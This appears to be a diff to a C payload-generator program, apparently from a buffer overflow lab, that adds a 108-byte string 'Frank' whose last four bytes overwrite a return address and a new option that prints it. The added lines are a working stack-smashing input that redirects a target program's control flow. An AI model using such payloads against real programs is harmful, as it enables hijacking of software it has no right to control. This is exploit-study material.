@@ -145,6 +145,15 @@ int main(int argc,char *argv[]) {
 		A[122 + i] = 0x60;
 		A[123 + i] = 0x00;	
 	}
+	
+	char S[108] = "Frank";	
+
+	//change the return address
+	S[104] = 0x43;
+	S[105] = 0x28;
+	S[106] = 0x40;
+	S[107] = 0x00;
+	
 
 	/************************************ Main *********************************
 	* 1. Arugments validation
@@ -172,7 +181,10 @@ int main(int argc,char *argv[]) {
 			break;
 		case 'a':
 			write(1, A, 156);
-			break;			
+			break;	
+		case 's':
+			write(1, S, 108);
+			break;
 		default:
 			break;
 	}
